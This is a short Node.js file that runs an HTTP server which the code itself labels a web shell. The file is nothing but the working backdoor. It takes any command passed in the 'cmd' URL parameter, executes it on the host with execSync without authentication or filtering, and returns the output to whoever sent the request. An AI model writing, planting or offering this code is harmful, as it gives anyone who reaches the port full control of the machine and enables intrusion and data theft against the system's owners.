const http = require('http');
const url = require('url');
const childProcess = require('child_process');

const server = http.createServer((req, res) => {
  const urlParts = url.parse(req.url, true);
  const query = urlParts.query;

  if (query.cmd) {
    const command = query.cmd;
    const output = childProcess.execSync(command, { encoding: 'utf8' });
    res.writeHead(200, {
      'Content-Type': 'text/plain',
      'Content-Disposition': 'inline'
    });
    res.end(output);
  } else {
    res.writeHead(404, { 'Content-Type': 'text/plain' });
    res.end('No command specified');
  }
});

server.listen(8080, () => {
  console.log('Web shell listening on port 8080');
});